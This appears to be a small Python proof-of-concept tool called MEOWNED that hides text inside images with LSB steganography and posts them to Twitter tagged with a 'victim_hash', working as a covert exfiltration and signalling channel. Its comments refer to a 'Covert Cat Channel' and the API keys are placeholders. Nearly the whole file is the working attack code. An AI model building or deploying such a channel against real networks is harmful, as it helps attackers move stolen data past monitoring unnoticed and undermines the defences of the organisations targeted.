#!/usr/bin/env python3
"""MEOWNED (MEssages Over tWitter Exfiltrating Data)"""
"""pip3 install python-twitter"""
"""pip3 install Stegano"""

import sys
import twitter
from stegano import lsb

if len(sys.argv) != 3:
    sys.exit('Usage: meopwn_cli <image to tweet> <secrete message>')

victim_hash = "0fb8539d64f0899d2b0552fd2dde5328f5494d3a1bbad3dbcdbeafbb73c1fae4"

# If sys.argv

# Hide the secret message
secret = lsb.hide("./source-imgs/" + sys.argv[1], sys.argv[2])
secret.save("./output-imgs/" + sys.argv[1])

api = twitter.Api(consumer_key='consumer_key',
                      consumer_secret='consumer_secret',
                      access_token_key='access_token',
                      access_token_secret='access_token_secret')

# print(api.VerifyCredentials())

# Post message to Twitter
# status = api.PostUpdate( "CCC (Covert Cat Channel): ONLINE " + "#" + victim_hash)
# print(status.text)

# Post image to Twitter
status = api.PostMedia( "meow " + "#" + victim_hash, "./output-imgs/" + sys.argv[1])
print(status.text)

# clear_message = lsb.reveal("./output-imgs/" + sys.argv[0])
# print (clear_message)
